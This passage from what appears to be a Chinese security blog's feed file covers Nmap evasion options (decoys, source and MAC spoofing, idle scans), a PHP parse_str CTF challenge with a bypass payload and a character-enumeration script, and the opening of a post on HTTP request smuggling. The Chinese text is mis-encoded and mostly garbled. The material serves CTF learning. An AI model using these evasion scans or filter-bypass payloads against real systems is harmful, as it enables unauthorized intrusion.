‡è¿›è¡Œæ“ä½œç³»ç»Ÿæ£€æµ‹(è‡³å°‘éœ€ç¡®çŸ¥è¯¥ä¸»æœºåˆ†åˆ«æœ‰ä¸€ä¸ªopenå’Œclosedçš„ç«¯å£)</span><br><span class="line">--osscan-guess  æ¨æµ‹æ“ä½œç³»ç»Ÿæ£€æµ‹ç»“æœ,å½“Nmapæ— æ³•ç¡®å®šæ‰€æ£€æµ‹çš„æ“ä½œç³»ç»Ÿæ—¶ï¼Œä¼šå°½å¯èƒ½åœ°æä¾›æœ€ç›¸è¿‘çš„åŒ¹é…ï¼ŒNmapé»˜è®¤è¿›è¡Œè¿™ç§åŒ¹é…</span><br></pre></td></tr></table></figure><p>é˜²ç«å¢™/IDSèº²é¿å’Œå“„éª—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-f; --mtu value                 æŒ‡å®šä½¿ç”¨åˆ†ç‰‡ã€æŒ‡å®šæ•°æ®åŒ…çš„MTU.</span><br><span class="line">-D decoy1,decoy2,ME             ä½¿ç”¨è¯±é¥µéšè”½æ‰«æ</span><br><span class="line">-S IP-ADDRESS                   æºåœ°å€æ¬ºéª—</span><br><span class="line">-e interface                    ä½¿ç”¨æŒ‡å®šçš„æ¥å£</span><br><span class="line">-g&#x2F; --source-port PROTNUM       ä½¿ç”¨æŒ‡å®šæºç«¯å£  </span><br><span class="line">--proxies url1,[url2],...       ä½¿ç”¨HTTPæˆ–è€…SOCKS4çš„ä»£ç† </span><br><span class="line"></span><br><span class="line">--data-length NUM               å¡«å……éšæœºæ•°æ®è®©æ•°æ®åŒ…é•¿åº¦è¾¾åˆ°NUM</span><br><span class="line">--ip-options OPTIONS            ä½¿ç”¨æŒ‡å®šçš„IPé€‰é¡¹æ¥å‘é€æ•°æ®åŒ…</span><br><span class="line">--ttl VALUE                     è®¾ç½®IP time-to-liveåŸŸ</span><br><span class="line">--spoof-mac ADDR&#x2F;PREFIX&#x2F;VEBDOR  MACåœ°å€ä¼ªè£…</span><br><span class="line">--badsum                        ä½¿ç”¨é”™è¯¯çš„checksumæ¥å‘é€æ•°æ®åŒ…</span><br></pre></td></tr></table></figure><p>Nmap è¾“å‡º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-oN                     å°†æ ‡å‡†è¾“å‡ºç›´æ¥å†™å…¥æŒ‡å®šçš„æ–‡ä»¶</span><br><span class="line">-oX                     è¾“å‡ºxmlæ–‡ä»¶</span><br><span class="line">-oS                     å°†æ‰€æœ‰çš„è¾“å‡ºéƒ½æ”¹ä¸ºå¤§å†™</span><br><span class="line">-oG                     è¾“å‡ºä¾¿äºé€šè¿‡bashæˆ–è€…perlå¤„ç†çš„æ ¼å¼,éxml</span><br><span class="line">-oA BASENAME            å¯å°†æ‰«æç»“æœä»¥æ ‡å‡†æ ¼å¼ã€XMLæ ¼å¼å’ŒGrepæ ¼å¼ä¸€æ¬¡æ€§è¾“å‡º</span><br><span class="line">-v                      æé«˜è¾“å‡ºä¿¡æ¯çš„è¯¦ç»†åº¦</span><br><span class="line">-d level                è®¾ç½®debugçº§åˆ«,æœ€é«˜æ˜¯9</span><br><span class="line">--reason                æ˜¾ç¤ºç«¯å£å¤„äºå¸¦ç¡®è®¤çŠ¶æ€çš„åŸå› </span><br><span class="line">--open                  åªè¾“å‡ºç«¯å£çŠ¶æ€ä¸ºopençš„ç«¯å£</span><br><span class="line">--packet-trace          æ˜¾ç¤ºæ‰€æœ‰å‘é€æˆ–è€…æ¥æ”¶åˆ°çš„æ•°æ®åŒ…</span><br><span class="line">--iflist                æ˜¾ç¤ºè·¯ç”±ä¿¡æ¯å’Œæ¥å£,ä¾¿äºè°ƒè¯•</span><br><span class="line">--log-errors            æŠŠæ—¥å¿—ç­‰çº§ä¸ºerrors&#x2F;waringsçš„æ—¥å¿—è¾“å‡º</span><br><span class="line">--append-output         è¿½åŠ åˆ°æŒ‡å®šçš„æ–‡ä»¶</span><br><span class="line">--resume FILENAME       æ¢å¤å·²åœæ­¢çš„æ‰«æ</span><br><span class="line">--stylesheet PATH&#x2F;URL   è®¾ç½®XSLæ ·å¼è¡¨ï¼Œè½¬æ¢XMLè¾“å‡º</span><br><span class="line">--webxml                ä»namp.orgå¾—åˆ°XMLçš„æ ·å¼</span><br><span class="line">--no-sytlesheet         å¿½ç•¥XMLå£°æ˜çš„XSLæ ·å¼è¡¨</span><br></pre></td></tr></table></figure><p>å…¶ä»–nmapé€‰é¡¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-6                      å¼€å¯IPv6</span><br><span class="line">-A                      OSè¯†åˆ«,ç‰ˆæœ¬æ¢æµ‹,è„šæœ¬æ‰«æå’Œtraceroute</span><br><span class="line">--datedir DIRNAME       è¯´æ˜ç”¨æˆ·Nmapæ•°æ®æ–‡ä»¶ä½ç½®</span><br><span class="line">--send-eth &#x2F; --send-ip  ä½¿ç”¨åŸä»¥å¤ªç½‘å¸§å‘é€&#x2F;åœ¨åŸIPå±‚å‘é€</span><br><span class="line">--privileged            å‡å®šç”¨æˆ·å…·æœ‰å…¨éƒ¨æƒé™</span><br><span class="line">--unprovoleged          å‡å®šç”¨æˆ·ä¸å…·æœ‰å…¨éƒ¨æƒé™,åˆ›å»ºåŸå§‹å¥—æ¥å­—éœ€è¦rootæƒé™</span><br><span class="line">-V                      æ‰“å°ç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">-h                      è¾“å‡ºå¸®åŠ©</span><br></pre></td></tr></table></figure><h3 id="ç«¯å£çŠ¶æ€"><a href="#ç«¯å£çŠ¶æ€" class="headerlink" title="ç«¯å£çŠ¶æ€"></a>ç«¯å£çŠ¶æ€</h3><ul><li>openï¼šç¡®å®šç«¯å£å¼€æ”¾ï¼Œå¯è¾¾</li><li>closed ï¼šå…³é—­çš„ç«¯å£å¯¹äºnmapä¹Ÿæ˜¯å¯è®¿é—®çš„ï¼Œ å®ƒæ¥æ”¶nmapæ¢æµ‹æŠ¥æ–‡å¹¶ä½œå‡ºå“åº”ã€‚ä½†æ²¡æœ‰åº”ç”¨ç¨‹åºåœ¨å…¶ä¸Šç›‘å¬ã€‚</li><li>filtered ï¼šç”±äºåŒ…è¿‡æ»¤é˜»æ­¢æ¢æµ‹æŠ¥æ–‡åˆ°è¾¾ç«¯å£ï¼ŒNmapæ— æ³•ç¡®å®šè¯¥ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚è¿‡æ»¤å¯èƒ½æ¥è‡ªä¸“ä¸šçš„é˜²ç«å¢™è®¾å¤‡ï¼Œè·¯ç”±è§„åˆ™ æˆ–è€…ä¸»æœºä¸Šçš„è½¯ä»¶é˜²ç«å¢™ã€‚</li><li>unfiltered ï¼šæœªè¢«è¿‡æ»¤çŠ¶æ€æ„å‘³ç€ç«¯å£å¯è®¿é—®ï¼Œä½†æ˜¯Nmapæ— æ³•ç¡®å®šå®ƒæ˜¯å¼€æ”¾è¿˜æ˜¯å…³é—­ã€‚ åªæœ‰ç”¨äºæ˜ å°„é˜²ç«å¢™è§„åˆ™é›†çš„ ACK æ‰«ææ‰ä¼šæŠŠç«¯å£åˆ†ç±»åˆ°è¿™ä¸ªçŠ¶æ€ã€‚</li><li>open | filtered ï¼šæ— æ³•ç¡®å®šç«¯å£æ˜¯å¼€æ”¾è¿˜æ˜¯è¢«è¿‡æ»¤ï¼Œ å¼€æ”¾çš„ç«¯å£ä¸å“åº”å°±æ˜¯ä¸€ä¸ªä¾‹å­ã€‚æ²¡æœ‰å“åº”ä¹Ÿå¯èƒ½æ„å‘³ç€æŠ¥æ–‡è¿‡æ»¤å™¨ä¸¢å¼ƒäº†æ¢æµ‹æŠ¥æ–‡æˆ–è€…å®ƒå¼•å‘çš„ä»»ä½•ååº”ã€‚UDPï¼ŒIPåè®®,FIN, Null ç­‰æ‰«æä¼šå¼•èµ·ã€‚</li><li>closed|filteredï¼šï¼ˆå…³é—­æˆ–è€…è¢«è¿‡æ»¤çš„ï¼‰ï¼šæ— æ³•ç¡®å®šç«¯å£æ˜¯å…³é—­çš„è¿˜æ˜¯è¢«è¿‡æ»¤çš„</li></ul><h3 id="æ‰«ææŠ€æœ¯"><a href="#æ‰«ææŠ€æœ¯" class="headerlink" title="æ‰«ææŠ€æœ¯"></a>æ‰«ææŠ€æœ¯</h3><ul><li>-sS/sT/sA/sW/sM:TCPæ‰«æ<ul><li>Sæ˜¯SYNæ‰«æï¼ŒåŠè¿æ¥æ‰«æï¼Œnmapåªå‘é€SYNæŠ¥æ–‡ï¼Œé€šè¿‡æœåŠ¡å™¨æ˜¯å¦å“åº”SYN+ACKæ¥åˆ¤æ–­å¯¹åº”ç«¯å£æ˜¯å¦å¼€æ”¾</li><li>Tæ˜¯å…¨è¿æ¥æ‰«æä¼šå’ŒæœåŠ¡å™¨å»ºç«‹å®Œæ•´çš„ä¸‰æ¬¡æ¡æ‰‹ï¼Œæ•ˆç‡ä½</li><li>Aå‘é€ACKæŠ¥æ–‡ï¼Œé€šè¿‡æœåŠ¡å™¨å“åº”æ¥åˆ¤æ–­æ˜¯å¦å¼€æ”¾ï¼Œæœ‰çš„æœåŠ¡å™¨ä¸å¼€ä¼šå›å¤ICMPç«¯å£ä¸å¯è¾¾ï¼Œå½“å›å¤RSTæ—¶è¡¨ç¤ºå¯èƒ½è¢«æ‹¦æˆªæˆ–è€…ç«¯å£å¼€æ”¾ï¼Œä¸æ˜¯ä¸€ä¸ªå‡†ç¡®çš„åˆ¤æ–­æ¡ä»¶</li><li>W æ˜¯çª—å£æ‰«æï¼Œå‘å‡ºçš„æŠ¥æ–‡å’ŒACKä¸€æ ·ï¼Œåˆ©ç”¨çš„æ˜¯åœ¨æŸäº›ç³»ç»Ÿä¸­å¦‚æœç«¯å£å¼€æ”¾ï¼Œæ”¶åˆ°ACKåŒ…åä¼šå“åº”ä¸€ä¸ªçª—å£é0çš„RSTåŒ…</li><li>Mæ˜¯Maimonæ‰«æï¼Œä½¿ç”¨å‘ç°è€…çš„åå­—å‘½åã€‚å…¶åŸç†æ˜¯å‘ç›®æ ‡æœåŠ¡å™¨å‘é€FIN/ACK æŠ¥æ–‡ï¼Œåœ¨æŸäº›ç³»ç»Ÿä¸­å¦‚æœç«¯å£å¼€æ”¾åˆ™ä¼šä¸¢å¼ƒè¯¥æŠ¥æ–‡ä¸åšå“åº”ï¼Œå¦‚æœç«¯å£å…³é—­åˆ™å›å¤RSTæˆ–è€…ICMPï¼ŒNmapå¯å€Ÿæ­¤åˆ¤æ–­æœåŠ¡å™¨ç«¯å£çš„å¼€æ”¾æƒ…å†µã€‚ä¸å‡†</li></ul></li><li>-sUï¼šUDPæ‰«æï¼ŒæŸäº›ç³»ç»Ÿå¦‚æœUDPç«¯å£ä¸å¼€æ”¾ä¼šå›å¤ICMPå·®é”™æŠ¥æ–‡ï¼ˆè¿™ä¹Ÿæ˜¯Linuxç³»ç»Ÿä¸­tracerouteçš„å®ç°åŸç†ï¼‰ã€‚Nmap UDPç«¯å£æ‰«æçš„å¼ºå¤§ä¹‹å¤„åœ¨äºå®ƒä¼šé’ˆå¯¹çŸ¥åç«¯å£æ„é€ åˆå§‹äº¤äº’æŠ¥æ–‡ï¼Œæ¯”å¦‚ä¼šé’ˆå¯¹UDP 500æ„é€ ä¸€ä¸ªä¸»æ¨¡å¼åå•†çš„IKEæŠ¥æ–‡</li><li>-sN/sF/sX:ç‰¹å®šTCPæ ‡å¿—ä½çš„æ‰«æï¼ŒNæ˜¯ç©ºæ ‡å¿—ä½ï¼›Fæ˜¯FINç½®ä½ï¼›Xæ˜¯Xmasæ‰«æå°†FINã€PSHã€URGåŒæ—¶ç½®ä½ã€‚æ”¶åˆ°RSTè¯´æ˜ç«¯å£å…³é—­ï¼Œæ— å“åº”è¯´æ˜è¢«è¿‡æ»¤æˆ–è€…ç«¯å£å¼€æ”¾ï¼Œä¸å‡†ã€‚</li><li>â€“scanflags &lt;flags&gt;ï¼šå®ç°ä¸ŠåŒä¸Šé¢å‡ ç§ç±»ä¼¼ï¼Œå¯ä»¥è®©ç”¨æˆ·è‡ªå®šä¹‰TCPæ ‡å¿—ä½ã€‚</li><li>-sI &lt;zombie host[:probeport]&gt;: Idleæ‰«æéœ€è¦ä¸€å°æ²¡æœ‰æµé‡çš„åƒµå°¸ä¸»æœºï¼Œè¿™ç§æ‰«æçš„å®ç°åŸç†æ˜¯åœ¨ä¸€å®šçš„æ—¶é—´é‡Œï¼ŒåŒä¸€å°ä¸»æœºå‘å‡ºçš„IPæ•°æ®æŠ¥æ–‡å…¶ipå¤´ä¸­çš„identificationå­—æ®µæ˜¯ç´¯åŠ çš„ã€‚æ¢æµ‹åˆ†ä¸º3æ­¥ï¼š1ã€Nmapä¸»æœºå‘åƒµå°¸æœºå‘åŒ…ï¼Œé€šè¿‡åƒµå°¸æœºçš„å“åº”åŒ…æ¢æµ‹å…¶IDï¼›2ã€Nmapä¸»æœºä¼ªé€ åƒµå°¸æœºæºåœ°å€å‘æœåŠ¡å™¨çš„ç‰¹å®šç«¯å£å‘é€SYNåŒ…ï¼›3ã€Nmapä¸»æœºå†æ¬¡æ¢æµ‹åƒµå°¸æœºçš„ip.idã€‚å¦‚æœç›®æ ‡æœåŠ¡å™¨ç«¯å£å¼€æ”¾ï¼Œåˆ™å¿…ç„¶ä¼šå‘åƒµå°¸æœºå‘é€SYN/ACKï¼Œç”±äºè«åå…¶å¦™æ”¶åˆ°ä¸€ä¸ªSYN/ACK æŠ¥æ–‡ï¼Œåƒµå°¸æœºä¼šå‘ç›®æ ‡æœåŠ¡å™¨å‘é€RSTæŠ¥æ–‡ï¼Œè¯¥æŠ¥æ–‡çš„ip.id æ˜¯ç¬¬ä¸€æ­¥+1ï¼Œåˆ™ç¬¬ä¸‰æ­¥Nmapä¸»æœºæ¢æµ‹åˆ°çš„ip.idåº”è¯¥æ˜¯ç¬¬ä¸€æ­¥+2ï¼Œè¯´æ˜ç›®æ ‡ä¸»æœºç«¯å£å¼€æ”¾ã€‚åä¹‹ï¼Œå¦‚æœç›®æ ‡ä¸»æœºç«¯å£æœªå¼€æ”¾ï¼Œåˆ™æ”¶åˆ°ç¬¬äºŒæ­¥çš„æŠ¥æ–‡åä¼šå‘åƒµå°¸æœºå›å¤RSTæˆ–è€…ç›´æ¥ä¸¢å¼ƒè¯¥æŠ¥æ–‡ä¸å“åº”ï¼Œæ— è®ºå“ªç§æƒ…å†µï¼Œéƒ½ä¸ä¼šè§¦å‘åƒµå°¸æœºå‘åŒ…ï¼Œè¿›è€Œåƒµå°¸æœºçš„ip.idä¸ä¼šå˜åŒ–ï¼Œç¬¬ä¸‰æ­¥Nmapæ¢æµ‹åˆ°çš„idåº”è¯¥æ˜¯ç¬¬ä¸€æ­¥+1.</li><li>-sY/sZ:SCTPåè®®INITæˆ–cookie-echoæ‰«æ</li><li>-sO:åŸºäºIPåè®®çš„æ‰«æï¼Œé€šè¿‡å˜æ¢IPæŠ¥æ–‡å¤´ä¸­çš„Protocolå€¼æ¥å¯¹æœåŠ¡å™¨è¿›è¡Œæ¢æµ‹</li><li>-b &lt;FTP relay host&gt;:ï¼šFTPåå¼¹æ‰«æï¼Œå€ŸåŠ©FTPç‰¹æ€§ï¼Œé€šè¿‡FTPæœåŠ¡å™¨è¿æ¥æƒ³è¦æ‰«æçš„ä¸»æœºå®ç°éšèº«çš„ç›®çš„</li></ul><h2 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h2><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/mq0036/p/11187138.html">https://www.cnblogs.com/mq0036/p/11187138.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> NetCat </tag>
            
            <tag> Nmap </tag>
            
            <tag> WireShack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§</title>
      <link href="2020/01/17/PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/"/>
      <url>2020/01/17/PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§ç›¸å…³å†…å®¹ï¼</p><a id="more"></a><h2 id="PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§"><a href="#PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§" class="headerlink" title="PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§"></a>PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§</h2><p> PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š</p><ol><li>åˆ é™¤ç©ºç™½ç¬¦ </li><li>å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿(åŒ…æ‹¬ç©ºæ ¼)</li></ol><p>phpè§£æå˜é‡æ˜¯ç”¨<code>parse_str()</code>æ¥è§£æçš„ï¼Œå…³äºè¿™ä¸ªå‡½æ•°çš„è¯¦ç»†ç”¨æ³•å‚è§ï¼š<a href="https://www.php.net/parse_str">https://www.php.net/parse_str</a></p><img src="/2020/01/17/PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/TIMæˆªå›¾20200117194140.png" style="zoom:67%;"><p>åˆ é™¤ç©ºç™½ç¬¦è¿™ä¸ªå¾ˆå¥½ç†è§£ï¼Œå…ˆçœ‹é“ctfé¢˜ç›®:</p><p>å†è¯´ä¸‹å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿è¿™ä¸ªç‰¹æ€§å§ï¼Œè¿˜æ˜¯å…ˆçœ‹ä¸€é“é¢˜å§ï¼</p><p>å¥‡æ€ªçš„æé¾™ç‰¹æ€§é¢˜ç›®æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">ini_set(<span class="string">&quot;display_error&quot;</span>, <span class="literal">false</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;A_A&#x27;</span>])?$_GET[<span class="string">&#x27;A_A&#x27;</span>]:<span class="string">&#x27;A_A&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&quot;A_A&quot;</span>) !==<span class="literal">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,have fun&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,too small&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((<span class="keyword">string</span>)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,too big&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆåœ¨è¯·æ±‚çš„urlåé¢ä¸èƒ½æœ‰<code>A_A</code>ï¼Œå¹¶ä¸”è¦ä¸æ»¡è¶³ä¸‹é¢ä¸¤ä¸ªæ¯”è¾ƒæ¡ä»¶</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¸‹é¢çš„payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?A A[]&#x3D;a</span><br></pre></td></tr></table></figure><p>phpä¼šå°†<code>A A</code>è§£ææˆ<code>A_A</code>ï¼Œæ•°ç»„å¤§äºä»»ä½•æ•°å­—ï¼Œå¯¹æ•°ç»„å¼ºåˆ¶stringç±»å‹è½¬æ¢ä¼šè½¬æ¢æˆaï¼Œaå’Œ0æ¯”è¾ƒæ—¶ï¼Œaä¼šè½¬æ¢ä¸ºæ•´å‹å³0</p><table><thead><tr><th align="left">ç”¨æˆ·è¾“å…¥</th><th align="left">è§£æå‰</th><th align="left">è§£æåå˜é‡å</th></tr></thead><tbody><tr><td align="left">%20foo_bar%00</td><td align="left">foo_bar</td><td align="left">foo_bar</td></tr><tr><td align="left">foo%20bar%00</td><td align="left">foo bar</td><td align="left">foo_bar</td></tr><tr><td align="left">foo%5bbar</td><td align="left">foo[bar</td><td align="left">foo_bar</td></tr></tbody></table><p>ç›´è§‚çš„çœ‹ä¸‹<code>parser_str</code>å‡½æ•°å¦‚ä½•å¤„ç†å­—ç¬¦ä¸²ï¼š</p><img src="/2020/01/17/PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/1567560394_5d6f12cab5cdc.gif" style="zoom: 33%;"><p>ä¸‹é¢æœ‰ä¸ªè„šæœ¬ï¼Œéå†äº†æ‰€æœ‰å­—ç¬¦ï¼Œä»¥<code>foo_bar</code>ä¸ºä¾‹ï¼Œéå†äº†ä¸‰ä¸ªä½ç½®phpåœ¨è§£ææ—¶çš„ä¸åŒ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;&#123;chr&#125;foo_bar&quot;</span>,</span><br><span class="line">        <span class="string">&quot;foo&#123;chr&#125;bar&quot;</span>,</span><br><span class="line">        <span class="string">&quot;foo_bar&#123;chr&#125;&quot;</span></span><br><span class="line">    ] <span class="keyword">as</span> $k =&gt; $arg) &#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">255</span>;$i++) &#123;</span><br><span class="line">        <span class="comment">// echo &quot;\033[999D\033[K\r&quot;;</span></span><br><span class="line">        <span class="comment">// echo &quot;[&quot;.$arg.&quot;] check &quot;.bin2hex(chr($i)).&quot;\n&quot;;</span></span><br><span class="line">        parse_str(str_replace(<span class="string">&quot;&#123;chr&#125;&quot;</span>,chr($i),$arg).<span class="string">&quot;=bla&quot;</span>,$o);</span><br><span class="line">        usleep(<span class="number">5000</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($o[<span class="string">&quot;foo_bar&quot;</span>])) &#123;</span><br><span class="line">            <span class="comment">// echo &quot;\033[999D\033[K\r&quot;;</span></span><br><span class="line">            <span class="keyword">echo</span> $arg.<span class="string">&quot; -&gt; &quot;</span>.bin2hex(chr($i)).<span class="string">&quot; (&quot;</span>.chr($i).<span class="string">&quot;)\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// echo &quot;\033[999D\033[K\r&quot;;</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2020/01/17/PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/TIMæˆªå›¾20200117205713.png" style="zoom:50%;"><p>åˆæ­¥è¯•äº†ä¸‹,å‘ç°å’Œè„šæœ¬ç»“æœä¸€æ ·ï¼Œå‘ç°ä¸‰ä¸ªä½ç½®çš„å·®åˆ«ï¼š</p><ol><li>ç¬¬ä¸€ä¸ªä½ç½®ä¸º<code>%20</code>,<code>%26</code>,<code>%2b</code>æ—¶éƒ½ä¼šå¿½ç•¥</li><li>ç¬¬äºŒä¸ªä½ç½®ä¸º<code>%20</code>,<code>%2b</code>,<code>%2e</code>,<code>%5b</code>éƒ½ä¼šæ›¿æ¢æˆ<code>_</code>ï¼Œå³<code>%5f</code></li><li>ç¬¬ä¸‰ä¸ªä½ç½®ä¸º<code>%00</code>,<code>%26</code>,<code>%3d</code>æ—¶éƒ½ä¼šå¿½ç•¥</li></ol><p>åæ¥å‘ç°ï¼Œå˜é‡åä¸­æœ‰<code>%20</code>,<code>%2b</code>,<code>%2e</code>,<code>%5b</code>éƒ½ä¼šæ›¿æ¢æˆ<code>_</code>ï¼Œå³<code>%5f</code></p><p>å‚è€ƒï¼š</p><p><a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>httpèµ°ç§å­¦ä¹ </title>
      <link href="2020/01/17/http%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/01/17/http%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†httpèµ°ç§ç›¸å…³å†…å®¹ï¼</p><a id="more"></a><h2 id="ä»€ä¹ˆæ˜¯httpèµ°ç§ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯httpèµ°ç§ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯httpèµ°ç§ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯httpèµ°ç§ï¼Ÿ</h2><p>HTTPè¯·æ±‚èµ°ç§æ˜¯ä¸€ç§å¹²æ‰°ç½‘ç«™å¤„ç†ä»ä¸€ä¸ªæˆ–å¤šä¸ªç”¨æˆ·æ¥æ”¶çš„HTTPè¯·æ±‚åºåˆ—çš„æ–¹å¼çš„æŠ€æœ¯ã€‚ä½¿æ”»å‡»è€…å¯ä»¥ç»•è¿‡å®‰å…¨æ§åˆ¶ï¼Œæœªç»æˆæƒè®¿é—®æ•æ„Ÿæ•°æ®å¹¶ç›´æ¥å±å®³å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·ã€‚</p><h2 id="ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿhttpèµ°ç§ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿhttpèµ°ç§ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿhttpèµ°ç§ï¼Ÿ"></a>ä¸ºä»€ä¹ˆä¼šäº§ç”Ÿhttpèµ°ç§ï¼Ÿ</h2><h3 id="è¯·æ±‚èµ°ç§æ¼æ´æˆå› "><a href="#è¯·æ±‚èµ°ç§æ¼æ´æˆå› " class="headerlink" title="è¯·æ±‚èµ°ç§æ¼æ´æˆå› "></a>è¯·æ±‚èµ°ç§æ¼æ´æˆå› </h3><p>å‰ç«¯æœåŠ¡å™¨(CDN)å’Œåç«¯æœåŠ¡å™¨æ¥æ”¶æ•°æ®ä¸åŒæ­¥ï¼Œå¼•èµ·å¯¹å®¢æˆ·ç«¯ä¼ 